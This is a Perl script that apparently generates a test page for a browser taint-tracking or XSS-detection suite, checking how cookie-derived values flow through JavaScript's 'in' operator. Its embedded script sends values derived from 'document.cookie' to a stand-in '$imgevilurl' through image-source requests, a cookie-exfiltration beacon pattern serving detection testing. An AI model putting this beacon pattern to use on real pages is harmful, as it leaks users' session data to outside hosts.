#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_IN";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		var evil = 2;
		if ($evil) {
			evil = 3;
		}
		var notevil = 42;
		var notevil2 = 42;
		var notevil3 = 42;
		var dut = { 'x' : 7 };
		var dut2 = { 'x' : 7 };
		var dut3 = { 'x' : 7 };

		// shouldn't be evil 
		notevil = "x" in dut;
		
		var url = "$imgevilurl?normal=" + notevil;
		document.images[0].src = url;
		
		// if with evil val 
		if ($evil) {
			notevil2 = "x" in dut2;
		}
		
		var url2 = "$imgevilurl?if=" + notevil2;
		document.images[1].src = url2;

		// normal usage 	
		if (evil) {
			dut3 = { 'x' : 8 };
		}
		notevil3 = "x" in dut3;

		var url3 = "$imgevilurl?isevil=" + dut3;
		document.images[2].src = url3;		
    </script>
|;

require "xss_basic_footer.pl";
